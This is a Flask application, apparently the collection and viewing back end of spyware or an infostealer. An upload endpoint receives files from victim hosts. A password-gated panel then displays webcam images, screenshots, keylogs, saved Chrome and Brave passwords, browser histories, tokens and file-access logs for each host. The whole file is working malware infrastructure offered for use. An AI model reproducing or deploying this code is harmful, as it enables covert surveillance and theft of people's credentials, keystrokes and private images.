# app.py
from flask import Flask, request, render_template_string
import os
from werkzeug.utils import secure_filename
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = 'logs'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Log Viewer</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #00ff00;
            font-family: Consolas, monospace;
        }
        h1 {
            text-align: center;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            table-layout: fixed;
        }
        th, td {
            border: 1px solid #00ff00;
            padding: 8px;
            text-align: center;
            word-wrap: break-word;
            font-size: 14px;
        }
        th {
            background-color: #000000;
            font-size: 16px;
        }
        input[type="password"] {
            background-color: #000;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 10px;
            margin-top: 20px;
            width: 200px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        button {
            background-color: #00ff00;
            color: #000;
            padding: 8px 16px;
            margin-top: 10px;
            border: none;
            cursor: pointer;
        }
        .screenshot-img {
            width: 120px;
        }
    </style>
</head>
<body>
    {% if not authorized %}
        <form method="POST">
            <input type="password" name="password" placeholder="Enter password">
            <button type="submit">Unlock</button>
        </form>
    {% else %}
        <h1>Logs in Server</h1>
        <table>
            <tr>
                <th>Hostname</th>
                <th>Time</th>
                <th> Desktop</th>
                <th> Webcam</th>
                <th> Keylogs</th>
                <th> Decrypted Keylogs</th>
                <th> Chrome History</th>
                <th> Brave History</th>
                <th> Chrome Passwords</th>
                <th> Brave Passwords</th>
                <th> Tokens</th>
                <th> Recent Files</th>
                <th> File Access</th>
            </tr>
            {% for row in rows %}
            <tr>
                {% for cell in row %}
                    <td>
                        {% if cell.endswith(('.png', '.jpg', '.jpeg')) %}
                            <img src="{{ url_for('static', filename=cell) }}" class="screenshot-img">
                        {% elif cell.endswith('.txt') %}
                            <a href="{{ url_for('static', filename=cell) }}" target="_blank">{{ cell }}</a>
                        {% else %}
                            {{ cell }}
                        {% endif %}
                    </td>
                {% endfor %}
            </tr>
            {% endfor %}
        </table>
    {% endif %}
</body>
</html>
'''

PASSWORD = "disha456"

@app.route('/', methods=['GET', 'POST'])
def index():
    authorized = False
    if request.method == 'POST' and request.form.get("password") == PASSWORD:
        authorized = True
    elif request.args.get("auth") == PASSWORD:
        authorized = True

    if not authorized:
        return render_template_string(HTML_TEMPLATE, authorized=False)

    rows = []
    for folder in sorted(os.listdir(UPLOAD_FOLDER), reverse=True):
        folder_path = os.path.join(UPLOAD_FOLDER, folder)
        if not os.path.isdir(folder_path): continue

        files = os.listdir(folder_path)
        cells = [
            folder.split("_")[0],  # Hostname
            folder.split("_")[1],  # Time
            find_file(files, folder_path, "screenshot"),
            find_file(files, folder_path, "webcam"),
            find_file(files, folder_path, "keylogs_export.txt"),
            find_file(files, folder_path, "decrypted_keylogs.txt"),
            find_file(files, folder_path, "chrome_history.txt"),
            find_file(files, folder_path, "brave_history.txt"),
            find_file(files, folder_path, "chrome_passwords.txt"),
            find_file(files, folder_path, "brave_passwords.txt"),
            find_file(files, folder_path, "extracted_tokens.txt"),
            find_file(files, folder_path, "recent_files.txt"),
            find_file(files, folder_path, "file_access_log.txt"),
        ]
        rows.append(cells)

    return render_template_string(HTML_TEMPLATE, authorized=True, rows=rows)

def find_file(files, folder_path, keyword):
    for f in files:
        if keyword in f:
            static_path = os.path.join("logs", os.path.basename(folder_path), f)
            return static_path.replace("\\", "/")
    return "-"

@app.route('/api/receive', methods=['POST'])
def receive_logs():
    try:
        host = request.form.get("host") or "unknown"
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        foldername = f"{host}_{timestamp}"
        path = os.path.join(UPLOAD_FOLDER, foldername)
        os.makedirs(path, exist_ok=True)

        for file_key in request.files:
            file = request.files[file_key]
            filename = secure_filename(file.filename)
            file.save(os.path.join(path, filename))

        return "✅ Logs received", 200
    except Exception as e:
        return f"❌ Error: {str(e)}", 500

if __name__ == "__main__":
    app.run(debug=True)
